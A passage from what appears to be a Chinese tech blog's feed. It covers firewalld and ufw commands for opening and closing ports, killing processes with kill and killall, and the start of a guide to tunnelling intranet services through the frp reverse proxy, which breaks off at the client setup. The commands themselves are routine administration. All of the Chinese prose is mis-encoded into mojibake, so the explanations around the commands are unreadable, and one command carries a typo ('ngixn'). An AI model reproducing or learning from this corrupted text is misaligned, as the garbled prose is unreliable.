æ¬¡æ²¡æœ‰å¼€æ”¾firewallç«¯å£æ—¶ï¼Œåªæœ‰<code>tcp6</code>è€Œæ— <code>tcp</code>çš„æƒ…å†µï¼Œå¯¼è‡´è®¿é—®å¤±è´¥ã€‚æ”¾è¡Œç«¯å£åè®¿é—®æ­£å¸¸ã€‚</p><p>è¿˜é‡åˆ°è¿‡åªèƒ½ä»æœ¬åœ° 127.0.0.1 æˆ– localhostï¼ˆå®é™…ä¸ŠäºŒè€…ä¸€æ ·çš„ï¼Œé»˜è®¤å†™åœ¨äº†hosté‡Œï¼‰è®¿é—®ï¼Œé€šè¿‡ï¼ˆç½‘å¡çš„ï¼‰IPåœ°å€æ— æ³•è®¿é—®çš„æƒ…å†µã€‚è¡¨ç°åœ¨ Local Address ä¸Šæ˜¯<code>127.0.0.1:xxxx</code>ï¼Œé€šè¿‡ä¿®æ”¹è¯¥ç¨‹åºçš„ç½‘ç»œè®¾ç½®æŠŠAddressä¿®æ”¹ä¸ºå¯¹åº”çš„IPæˆ– <code>0.0.0.0</code>ï¼Œå³å¯è§£å†³è®¿é—®çš„é—®é¢˜ã€‚</p><hr><h4 id="ä»¥ä¸‹æ“ä½œä¹‹åéƒ½è¦æ‰§è¡Œ-é‡è½½-æˆ–-é‡å¯-æ‰èƒ½ç”Ÿæ•ˆï¼ï¼ï¼"><a href="#ä»¥ä¸‹æ“ä½œä¹‹åéƒ½è¦æ‰§è¡Œ-é‡è½½-æˆ–-é‡å¯-æ‰èƒ½ç”Ÿæ•ˆï¼ï¼ï¼" class="headerlink" title="ä»¥ä¸‹æ“ä½œä¹‹åéƒ½è¦æ‰§è¡Œ é‡è½½ æˆ– é‡å¯ æ‰èƒ½ç”Ÿæ•ˆï¼ï¼ï¼"></a><strong>ä»¥ä¸‹æ“ä½œä¹‹åéƒ½è¦æ‰§è¡Œ é‡è½½ æˆ– é‡å¯ æ‰èƒ½ç”Ÿæ•ˆ</strong>ï¼ï¼ï¼</h4><h4 id="å¼€å¯ç‰¹å®šç«¯å£"><a href="#å¼€å¯ç‰¹å®šç«¯å£" class="headerlink" title="å¼€å¯ç‰¹å®šç«¯å£"></a>å¼€å¯ç‰¹å®šç«¯å£</h4><pre class="language-bash" data-language="bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">80</span>/tcp --permanent  <span class="token comment"># å¼€æ”¾ç«¯å£</span>systemctl restart firewalld.service    <span class="token comment"># é‡å¯firewall</span></code></pre><p>å…¶ä¸­ï¼Œ å‚æ•°å«ä¹‰ä¸º<br><code>--zone</code> ä½œç”¨åŸŸ<br><code>--add-port=80/tcp</code>  æ·»åŠ ç«¯å£ï¼Œæ ¼å¼ä¸ºï¼šç«¯å£/é€šè®¯åè®®ï¼ˆ<code>tcp</code>æˆ–<code>udp</code>ï¼‰<br><code>--permanent</code>   æ°¸ä¹…ç”Ÿæ•ˆï¼Œæ²¡æœ‰æ­¤å‚æ•°é‡å¯åå¤±æ•ˆ     </p><blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># firewall-cmd --zone=public --add-port=80/tcp --permanent</span>success</code></pre><p>æˆåŠŸåˆ™è¿”å› success</p></blockquote><h4 id="å¼€æ”¾å¤šä¸ªç«¯å£"><a href="#å¼€æ”¾å¤šä¸ªç«¯å£" class="headerlink" title="å¼€æ”¾å¤šä¸ªç«¯å£"></a>å¼€æ”¾å¤šä¸ªç«¯å£</h4><pre class="language-bash" data-language="bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">8080</span>-8083/tcp --permanentfirewall-cmd --reload   <span class="token comment"># é…ç½®ç«‹å³ç”Ÿæ•ˆ</span></code></pre><h4 id="å…³é—­ç‰¹å®šç«¯å£"><a href="#å…³é—­ç‰¹å®šç«¯å£" class="headerlink" title="å…³é—­ç‰¹å®šç«¯å£"></a>å…³é—­ç‰¹å®šç«¯å£</h4><pre class="language-bash" data-language="bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --remove-port<span class="token operator">=</span><span class="token number">5672</span>/tcp --permanent  <span class="token comment">#å…³é—­5672ç«¯å£</span>firewall-cmd --reload   <span class="token comment"># é…ç½®ç«‹å³ç”Ÿæ•ˆ</span><span class="token comment"># ä¹Ÿå¯ä»¥ç”¨restart</span></code></pre><h4 id="é’ˆå¯¹æŸä¸ª-IP-å¼€æ”¾ç«¯å£"><a href="#é’ˆå¯¹æŸä¸ª-IP-å¼€æ”¾ç«¯å£" class="headerlink" title="é’ˆå¯¹æŸä¸ª IP å¼€æ”¾ç«¯å£"></a>é’ˆå¯¹æŸä¸ª IP å¼€æ”¾ç«¯å£</h4><pre class="language-bash" data-language="bash"><code class="language-bash">firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source  address="</span><span class="token number">192.168</span>.142.166<span class="token string">" port protocol="</span>tcp<span class="token string">" port="</span><span class="token number">6379</span><span class="token string">" accept"</span>firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span><span class="token number">192.168</span>.0.233<span class="token string">" accept"</span></code></pre><h4 id="åˆ é™¤æŸä¸ª-IP"><a href="#åˆ é™¤æŸä¸ª-IP" class="headerlink" title="åˆ é™¤æŸä¸ª IP"></a>åˆ é™¤æŸä¸ª IP</h4><pre class="language-bash" data-language="bash"><code class="language-bash">firewall-cmd --permanent --remove-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span><span class="token number">192.168</span>.1.51<span class="token string">" accept"</span></code></pre><h4 id="é’ˆå¯¹ä¸€ä¸ª-IP-æ®µè®¿é—®"><a href="#é’ˆå¯¹ä¸€ä¸ª-IP-æ®µè®¿é—®" class="headerlink" title="é’ˆå¯¹ä¸€ä¸ª IP æ®µè®¿é—®"></a>é’ˆå¯¹ä¸€ä¸ª IP æ®µè®¿é—®</h4><pre class="language-bash" data-language="bash"><code class="language-bash">firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span><span class="token number">192.168</span>.0.0/16<span class="token string">" accept"</span>firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source  address="</span><span class="token number">192.168</span>.1.0/24<span class="token string">" port protocol="</span>tcp<span class="token string">" port="</span><span class="token number">9200</span><span class="token string">" accept"</span></code></pre><br><hr><br><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>Ubuntu ç³»ç»Ÿé»˜è®¤æä¾›äº†ä¸€ä¸ªåŸºäº<code>iptables</code>ä¹‹ä¸Šçš„é˜²ç«å¢™å·¥å…·<code>ufw</code>ã€‚</p><h3 id="å¸¸ç”¨å‘½ä»¤-1"><a href="#å¸¸ç”¨å‘½ä»¤-1" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><h4 id="å®‰è£…ufw"><a href="#å®‰è£…ufw" class="headerlink" title="å®‰è£…ufw"></a>å®‰è£…<code>ufw</code></h4><p>ï¼ˆé»˜è®¤å·²å®‰è£…ï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ufw</code></pre><h4 id="å¯ç”¨ufwï¼Œä¸”åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªå¯"><a href="#å¯ç”¨ufwï¼Œä¸”åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªå¯" class="headerlink" title="å¯ç”¨ufwï¼Œä¸”åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªå¯"></a>å¯ç”¨<code>ufw</code>ï¼Œä¸”åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªå¯</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw <span class="token builtin class-name">enable</span></code></pre><h4 id="å…³é—­ufw"><a href="#å…³é—­ufw" class="headerlink" title="å…³é—­ufw"></a>å…³é—­<code>ufw</code></h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw disable</code></pre><h4 id="æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€"><a href="#æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€"></a>æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw status</code></pre><h4 id="æ—¥å¿—"><a href="#æ—¥å¿—" class="headerlink" title="æ—¥å¿—"></a>æ—¥å¿—</h4><p>ç³»ç»Ÿæ—¥å¿—ä¿å­˜äº<code>/var/log/ufw.log</code>ã€‚LEVELæŒ‡å®šä¸åŒçš„çº§åˆ« ï¼Œé»˜è®¤çº§åˆ«æ˜¯â€˜ä½â€™</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw logging on<span class="token operator">|</span>off  LEVEL   </code></pre><h3 id="ç«¯å£ç›¸å…³"><a href="#ç«¯å£ç›¸å…³" class="headerlink" title="ç«¯å£ç›¸å…³"></a>ç«¯å£ç›¸å…³</h3><h4 id="è®¾ç½®é»˜è®¤ç­–ç•¥"><a href="#è®¾ç½®é»˜è®¤ç­–ç•¥" class="headerlink" title="è®¾ç½®é»˜è®¤ç­–ç•¥"></a>è®¾ç½®é»˜è®¤ç­–ç•¥</h4><p>ï¼ˆæ¯”å¦‚ â€œmostly openâ€ vs â€œmostly closedâ€ï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw default allow  <span class="token comment"># å…è®¸æ‰€æœ‰å¤–éƒ¨å¯¹æœ¬æœºçš„è®¿é—®ï¼Œä¸”æœ¬æœºè®¿é—®å¤–éƒ¨æ­£å¸¸ã€‚</span><span class="token function">sudo</span> ufw default deny   <span class="token comment"># å…³é—­æ‰€æœ‰å¤–éƒ¨å¯¹æœ¬æœºçš„è®¿é—®ï¼Œä½†æœ¬æœºè®¿é—®å¤–éƒ¨æ­£å¸¸ã€‚</span></code></pre><h4 id="æ‰“å¼€æŸä¸ªç«¯å£"><a href="#æ‰“å¼€æŸä¸ªç«¯å£" class="headerlink" title="æ‰“å¼€æŸä¸ªç«¯å£"></a>æ‰“å¼€æŸä¸ªç«¯å£</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow smtpã€€   <span class="token comment"># å…è®¸æ‰€æœ‰çš„å¤–éƒ¨IPè®¿é—®æœ¬æœºçš„25/tcp ï¼ˆsmtpï¼‰ç«¯å£</span><span class="token function">sudo</span> ufw allow <span class="token number">22</span>/tcp   <span class="token comment"># å…è®¸æ‰€æœ‰çš„å¤–éƒ¨IPè®¿é—®æœ¬æœºçš„22/tcp ï¼ˆsshï¼‰ç«¯å£</span><span class="token function">sudo</span> ufw allow <span class="token number">53</span>       <span class="token comment"># å…è®¸å¤–éƒ¨è®¿é—®53ç«¯å£ï¼ˆtcp/udpï¼‰</span><span class="token function">sudo</span> ufw allow from <span class="token number">192.168</span>.1.100  <span class="token comment"># å…è®¸æ­¤IPè®¿é—®æ‰€æœ‰çš„æœ¬æœºç«¯å£</span><span class="token function">sudo</span> ufw allow proto udp <span class="token number">192.168</span>.0.1 port <span class="token number">53</span> to <span class="token number">192.168</span>.0.2 port <span class="token number">53</span><span class="token function">sudo</span> ufw allow <span class="token keyword">in</span> on eth0 from <span class="token number">192.168</span>.0.0/16  <span class="token comment"># å…è®¸æ¥è‡ª192.168.0.0-192.168.255.255çš„æ•°æ®é€šè¿‡eth0ç½‘å¡è¿›å…¥ä¸»æœº</span><span class="token function">sudo</span> ufw allow out on eth1 to <span class="token number">10.0</span>.0.0/8   <span class="token comment"># å…è®¸æŒ‡å‘10.0.0.0-10.255.255.255çš„æ•°æ®é€šè¿‡eth1ç½‘å¡ä»æœ¬æœºå‘å‡º</span></code></pre><p>å¯ä»¥ç”¨<code>less /etc/services</code>åˆ—å‡ºæ‰€æœ‰æœåŠ¡ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬è¯¥æœåŠ¡ä½¿ç”¨äº†å“ªä¸ªç«¯å£å’Œå“ªç§åè®®</p><h4 id="å…³é—­ç«¯å£"><a href="#å…³é—­ç«¯å£" class="headerlink" title="å…³é—­ç«¯å£"></a>å…³é—­ç«¯å£</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw deny smtp          <span class="token comment"># ç¦æ­¢å¤–éƒ¨è®¿é—®smtpæœåŠ¡</span><span class="token function">sudo</span> ufw delete allow smtp  <span class="token comment"># åˆ é™¤ä¸Šé¢å»ºç«‹çš„æŸæ¡è§„åˆ™</span><span class="token function">sudo</span> ufw delete allow <span class="token number">80</span>    <span class="token comment"># ç¦æ­¢å¤–éƒ¨è®¿é—®80ç«¯å£</span><span class="token function">sudo</span> ufw deny proto tcp from <span class="token number">10.0</span>.0.0/8 to <span class="token number">192.168</span>.0.1 port <span class="token number">25</span>  <span class="token comment"># æ‹’ç»æ¥è‡ª10.0.0.0/8åŸŸtcpåè®®æŒ‡å‘192.168.0.1ç«¯å£25çš„æ•°æ®è¿›å…¥æœ¬æœº</span></code></pre><h4 id="è·¯ç”±"><a href="#è·¯ç”±" class="headerlink" title="è·¯ç”±"></a>è·¯ç”±</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw route allow <span class="token keyword">in</span> on eth1 out on eth2   <span class="token comment"># å…è®¸ç»eth1è¿›å…¥ï¼Œeth2å‘å‡ºçš„æ•°æ®ç»æœ¬æœºè·¯ç”±</span></code></pre><hr><h2 id="è¿›ç¨‹ç›¸å…³å‘½ä»¤"><a href="#è¿›ç¨‹ç›¸å…³å‘½ä»¤" class="headerlink" title="è¿›ç¨‹ç›¸å…³å‘½ä»¤"></a>è¿›ç¨‹ç›¸å…³å‘½ä»¤</h2><h3 id="æŸ¥çœ‹è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯"><a href="#æŸ¥çœ‹è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯"></a>æŸ¥çœ‹è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># ps 1</span>  PID TTY      STAT   TIME COMMAND    <span class="token number">1</span> ?        Ss     <span class="token number">7</span>:25 /usr/lib/systemd/systemd --switched-root --system --deserialize <span class="token number">22</span></code></pre><h3 id="æ€æ­»è¿›ç¨‹"><a href="#æ€æ­»è¿›ç¨‹" class="headerlink" title="æ€æ­»è¿›ç¨‹"></a>æ€æ­»è¿›ç¨‹</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">kill</span> -9 <span class="token number">1234</span></code></pre><p>1234ä¸ºå¯¹åº”çš„PID</p><blockquote><p>åªæœ‰ç¬¬9ç§ä¿¡å·(SIGKILL)æ‰å¯ä»¥æ— æ¡ä»¶ç»ˆæ­¢è¿›ç¨‹ï¼Œå…¶ä»–ä¿¡å·è¿›ç¨‹éƒ½æœ‰æƒåˆ©å¿½ç•¥ã€‚    </p><p>ä¸‹é¢æ˜¯å¸¸ç”¨çš„ä¿¡å·ï¼š<br>HUP    1    ç»ˆç«¯æ–­çº¿<br>INT     2    ä¸­æ–­ï¼ˆåŒ Ctrl + Cï¼‰<br>QUIT    3    é€€å‡ºï¼ˆåŒ Ctrl + \ï¼‰<br>TERM   15    ç»ˆæ­¢<br>KILL    9    å¼ºåˆ¶ç»ˆæ­¢<br>CONT   18    ç»§ç»­ï¼ˆä¸STOPç›¸åï¼Œ fg/bgå‘½ä»¤ï¼‰<br>STOP    19    æš‚åœï¼ˆåŒ Ctrl + Zï¼‰  </p></blockquote><p>æˆ–è€… </p><p><strong>æ€æ­»æŒ‡å®šåå­—çš„è¿›ç¨‹</strong>ï¼ˆkill processes by nameï¼‰ï¼Œå¯ä»¥æ‰¹é‡ç»“æŸæŸä¸ªæœåŠ¡ç¨‹åºå¸¦æœ‰çš„å…¨éƒ¨è¿›ç¨‹ã€‚</p><ol><li>æ€æ­»æ‰€æœ‰åŒåè¿›ç¨‹    <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">killall</span> nginx<span class="token function">killall</span> -9 <span class="token function">bash</span></code></pre></li><li>å‘è¿›ç¨‹å‘é€æŒ‡å®šä¿¡å·    <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">killall</span> -<span class="token environment constant">TERM</span> ngixn  <span class="token comment"># æˆ–è€…  killall -KILL nginx</span></code></pre><blockquote><p>å‘½ä»¤å‚æ•°ï¼š</p><pre class="language-none"><code class="language-none">-Z åªæ€æ­»æ‹¥æœ‰scontext çš„è¿›ç¨‹-e è¦æ±‚åŒ¹é…è¿›ç¨‹åç§°-I å¿½ç•¥å°å†™-g æ€æ­»è¿›ç¨‹ç»„è€Œä¸æ˜¯è¿›ç¨‹-i äº¤äº’æ¨¡å¼ï¼Œæ€æ­»è¿›ç¨‹å‰å…ˆè¯¢é—®ç”¨æˆ·-l åˆ—å‡ºæ‰€æœ‰çš„å·²çŸ¥ä¿¡å·åç§°-q ä¸è¾“å‡ºè­¦å‘Šä¿¡æ¯-s å‘é€æŒ‡å®šçš„ä¿¡å·-v æŠ¥å‘Šä¿¡å·æ˜¯å¦æˆåŠŸå‘é€-w ç­‰å¾…è¿›ç¨‹æ­»äº¡--help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯--version æ˜¾ç¤ºç‰ˆæœ¬æ˜¾ç¤º</code></pre></blockquote></li></ol><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/zll_0405/article/details/81208606">https://blog.csdn.net/zll_0405/article/details/81208606</a></p><p><a href="https://blog.csdn.net/bigdata_mining/article/details/80699180">https://blog.csdn.net/bigdata_mining/article/details/80699180</a></p><p>etc.</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> tips </tag>
            
            <tag> Configuration </tag>
            
            <tag> firewall </tag>
            
            <tag> ç«¯å£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºfrpå®ç°å†…ç½‘ç©¿é€</title>
      <link href="2020/01/29/Server_frp/"/>
      <url>2020/01/29/Server_frp/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰ä¸ºäº†å®ç°è¿œç¨‹ç¼–ç¨‹ï¼ŒæŠ˜è…¾äº†ä¸€é˜µå­<code>autossh</code>ï¼Œåˆ©ç”¨åå‘ä»£ç†æŠŠå†…ç½‘æœåŠ¡å™¨çš„sshæ˜ å°„åˆ°äº†å…¬ç½‘ç«¯å£ï¼Œè¯¦è§ä¸‹é¢è¿™ç¯‡ã€‚</p><blockquote><p><a href="https://miaotony.xyz/2019/12/21/Idea_RemoteProgramming/">å°æƒ³æ³• | åŸºäºVSCodeå’Œsshå®ç°è¿œç¨‹ç¼–ç¨‹/ç‚¼ä¸¹</a></p></blockquote><p>è¿™æ¬¡éœ€æ±‚æ‰©å¤§äº†ä¸€ç‚¹ï¼Œæ¯”å¦‚è¯´æƒ³è®¿é—®<strong>å†…ç½‘æ­å»ºçš„ç½‘ç«™ã€æ•°æ®åº“ç­‰ç­‰</strong>ï¼Œä½†è¿™äº›éƒ½<strong>ä¸èƒ½ç›´æ¥åœ¨å…¬ç½‘è¿›è¡Œè®¿é—®</strong>ï¼Œ<code>autossh</code>å°±æœ‰ç‚¹ä¸å¤§ç»™åŠ›äº†ã€‚</p><p>ä¹‹å‰è¿˜äº†è§£è¿‡èŠ±ç”Ÿå£³ã€ngrokè¿™äº›ï¼Œä½†æ˜¯ä¸€èˆ¬éœ€è¦moneyè¦é™é€Ÿæˆ–è€…è¯´ä¸å¤§å‹å¥½ï¼Œç„¶åä¸€æƒ³å¤§å®¶éƒ½åœ¨æ¨è<code>frp</code>ï¼Œè¿™å›å°±æ¥æŠ˜è…¾ä¸€ä¸‹å§ï¼ï¼ˆä¸»è¦æ˜¯ä»¥åå¿˜äº†è¿˜å¯ä»¥å›æ¥çœ‹å˜»å˜»</p><p>æ€»ä½“æ„Ÿå—å°±æ˜¯ï¼Œ**<code>frp</code>æ­å»ºèµ·æ¥æ¯”<code>autossh</code>æ–¹ä¾¿å¤šäº†**å‘€ï¼</p><br><hr><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><h3 id="What-is-frp"><a href="#What-is-frp" class="headerlink" title="What is frp?"></a>What is frp?</h3><blockquote><p><em>frp</em> is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet. As of now, it supports <strong>TCP</strong> and <strong>UDP</strong>, as well as <strong>HTTP</strong> and <strong>HTTPS</strong> protocols, where requests can be forwarded to internal services by domain name.</p><p><em>frp</em> also has a P2P connect mode.</p></blockquote><blockquote><p>frp æ˜¯ä¸€ä¸ªå¯ç”¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œæ”¯æŒ tcp, udp åè®®ï¼Œä¸º http å’Œ https åº”ç”¨åè®®æä¾›äº†é¢å¤–çš„èƒ½åŠ›ï¼Œä¸”å°è¯•æ€§æ”¯æŒäº†ç‚¹å¯¹ç‚¹ç©¿é€ã€‚</p></blockquote><p><img src="/2020/01/29/Server_frp/architecture.png" alt="architecture"></p><p>FRPï¼Œfast reverse proxyã€‚ä½¿ç”¨ Go è¯­è¨€å¼€å‘ï¼Œæ”¯æŒ Windowsã€Linuxã€macOSã€ARM ç­‰å¤šå¹³å°éƒ¨ç½²ã€‚</p><p>å…¶å®ç®€å•åœ°è¯´ä¹Ÿå°±æ˜¯å€ŸåŠ©ä¸€å°æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ä½œä¸ºä¸­è½¬ï¼ŒæŠŠå†…å¤–ç½‘ç›´æ¥çš„æµé‡è¿æ¥èµ·æ¥ã€‚</p><p>å…¶å¼€æºä»“åº“ï¼š<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><h3 id="What-should-I-prepare"><a href="#What-should-I-prepare" class="headerlink" title="What should I prepare?"></a>What should I prepare?</h3><p><strong>å†…ç½‘ä¸»æœºï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼š</strong>èƒ½ä¸Šäº’è”ç½‘ï¼ˆå¤–ç½‘ï¼‰ï¼Œæˆ–è€…è¯´èƒ½è¿ä¸Šä½ çš„å…¬ç½‘æœåŠ¡å™¨å°±è¡Œã€‚ï¼ˆä½†æ²¡æœ‰å…¬ç½‘IPï¼‰</p><p>å¯ä»¥æ˜¯ç”µè„‘ï¼ˆWindowsï¼ŒMacOSï¼ŒLinuxï¼‰/åµŒå…¥å¼è®¾å¤‡ï¼ˆå¦‚æ ‘è“æ´¾ï¼‰â€¦å¯¹çš„ï¼Œ<strong>frpè·¨å¹³å°</strong>ã€‚</p><p><strong>å…¬ç½‘ä¸»æœºï¼ˆæœåŠ¡ç«¯ï¼‰ï¼š</strong>æœ‰å…¬ç½‘IPï¼Œæˆ–è€…ç»‘å®šäº†åŸŸåèƒ½é€šè¿‡ç«¯å£è®¿é—®ä¹Ÿè¡Œã€‚</p><p>ä»¥åŠ</p><p>æƒ³<strong>è¿æ¥å†…ç½‘çš„ä½ å–œæ¬¢çš„è®¾å¤‡</strong>ã€‚</p><br><hr><br><h2 id="æ­å»ºè¿‡ç¨‹"><a href="#æ­å»ºè¿‡ç¨‹" class="headerlink" title="æ­å»ºè¿‡ç¨‹"></a>æ­å»ºè¿‡ç¨‹</h2><p>åˆ†ä¸º<strong>æœåŠ¡å™¨ç«¯</strong>å’Œ<strong>å®¢æˆ·ç«¯</strong>ä¸¤éƒ¨åˆ†ã€‚</p><h3 id="ä¸‹è½½ç¨‹åº"><a href="#ä¸‹è½½ç¨‹åº" class="headerlink" title="ä¸‹è½½ç¨‹åº"></a>ä¸‹è½½ç¨‹åº</h3><p>æ ¹æ®å¯¹åº”çš„æ“ä½œç³»ç»ŸåŠæ¶æ„ï¼Œä» <a href="https://github.com/fatedier/frp/releases">Release</a> é¡µé¢ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ç¨‹åºã€‚</p><p>ç›®å‰æœ€æ–°çš„ç‰ˆæœ¬æ˜¯ <code>v0.31.1</code></p><p>æ¯”å¦‚Windows64ä½ä¸‹è½½ <a href="https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_windows_amd64.zip">frp_0.31.1_windows_amd64.zip</a>ï¼Œ</p><p>Linux64ä½ä¸€èˆ¬æ˜¯è¿™ä¸ª <a href="https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz">frp_0.31.1_linux_amd64.tar.gz</a>ã€‚</p><p>å…¶ä»–ç³»ç»Ÿ/æ¶æ„çš„å¯¹åº”ä¸‹è½½å°±å¥½äº†ã€‚</p><p><img src="/2020/01/29/Server_frp/download.png" alt="ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶"></p><p>å°† <strong>frps</strong> åŠ <strong>frps.ini</strong> æ”¾åˆ°å…·æœ‰å…¬ç½‘ IP çš„æœºå™¨ä¸Šã€‚</p><p>å°† <strong>frpc</strong> åŠ <strong>frpc.ini</strong> æ”¾åˆ°å¤„äºå†…ç½‘ç¯å¢ƒçš„æœºå™¨ä¸Šã€‚</p><h3 id="æœåŠ¡å™¨ç«¯çš„æ­å»º"><a href="#æœåŠ¡å™¨ç«¯çš„æ­å»º" class="headerlink" title="æœåŠ¡å™¨ç«¯çš„æ­å»º"></a>æœåŠ¡å™¨ç«¯çš„æ­å»º</h3><p>å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šå¯ä»¥ç”¨wgetä¸‹è½½ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> -p /etc/frp<span class="token builtin class-name">cd</span> /etc/frp<span class="token function">sudo</span> <span class="token function">wget</span> <span class="token string">"https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz"</span><span class="token function">sudo</span> <span class="token function">tar</span> xzvf frp_0.31.1_linux_amd64.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> frp_0.31.1_linux_amd64/* /etc/frp</code></pre><p>ç„¶è€Œå›½å†…ä¸‹è½½é€Ÿåº¦æ„Ÿäººï¼Œå¤§æ¦‚8Mçš„æ–‡ä»¶å°±å‡ KB/sâ€¦</p><p>äºæ˜¯è¿˜ä¸å¦‚ç›´æ¥æ­ä¸ªæ¢¯å­åˆ°å¤–é¢ä¸‹è½½å¥½äº†å†ä¼ åˆ°æœåŠ¡å™¨ä¸Šã€‚</p><p>æœåŠ¡å™¨ç«¯serverå˜›ï¼Œå½“ç„¶ç”¨çš„æ˜¯ <strong>frps</strong> åŠ <strong>frps.ini</strong>ã€‚</p><p>å®Œæ•´ç‰ˆçš„ <code>frps_full.ini</code>é‡Œé¢æœ‰å¾ˆè¯¦ç»†çš„æ³¨é‡Šï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å‚è€ƒã€‚</p><br><p>æœ€ç®€å•çš„<strong>é…ç½®</strong>å°±ç›´æ¥è¿™æ ·å†™</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># frps.ini</span><span class="token selector">[common]</span><span class="token constant">bind_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000</span></code></pre><p>ç„¶å**å¯åŠ¨<code>frps</code>**ï¼ˆLinuxä¸‹ï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash">/etc/frp/frps -c /etc/frp/frps.ini</code></pre><p>å†å»æŠŠç³»ç»Ÿçš„<strong>é˜².ç«|å¢™æ‰“å¼€</strong>ï¼Œä»¥åŠé˜¿é‡Œäº‘ç­‰å¹³å°çš„<strong>å®‰å…¨ç»„è§„åˆ™è®¾å¥½å…è®¸å…¥ç«™å‡ºç«™</strong>ã€‚</p><blockquote><p>è¿™ä¸ªfirewallææ­»æˆ‘äº†emmmæŠ˜è…¾äº†è€åŠå¤©æœ€åå‘ç°æ²¡æ”¾è¡Œç«¯å£â€¦â€¦</p><p>åé¢å†å†™ä¸€ç¯‡å…³äºfirewallé…ç½®çš„ã€‚</p></blockquote><p>å¥½äº†ï¼Œä¸‹é¢åˆ°å®¢æˆ·ç«¯ã€‚</p><hr><h3 id="å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰çš„æ­å»º"><a href="#å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰çš„æ­å»º" class="headerlink" 